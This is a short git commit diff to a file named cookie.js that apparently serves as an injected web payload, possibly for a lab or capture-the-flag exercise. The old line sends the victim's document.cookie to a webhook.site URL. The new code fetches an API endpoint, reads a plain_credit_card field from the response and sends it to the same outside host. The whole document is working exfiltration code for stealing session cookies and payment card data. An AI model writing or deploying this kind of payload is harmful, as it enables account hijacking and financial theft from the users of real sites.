7cf806a6963df4f7e005db2a7e7a769cde9f190e
alakinnn <hoang2504.rmit@gmail.com>
2025-06-19 20:57:21 +0700

    a

--- cookie.js
+++ cookie.js
@@ -1,1 +1,14 @@
-new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cookie=" + encodeURIComponent(document.cookie);
+fetch("/api.php?case=detail_info")
+  .then(res => {
+    console.log("Status:", res.status);
+    return res.text();
+  })
+  .then(txt => {
+    console.log("Raw response:", txt);
+    try {
+      const data = JSON.parse(txt);
+      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(data.plain_credit_card || 'N/A');
+    } catch (e) {
+      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=INVALID_JSON";
+    }
+  });
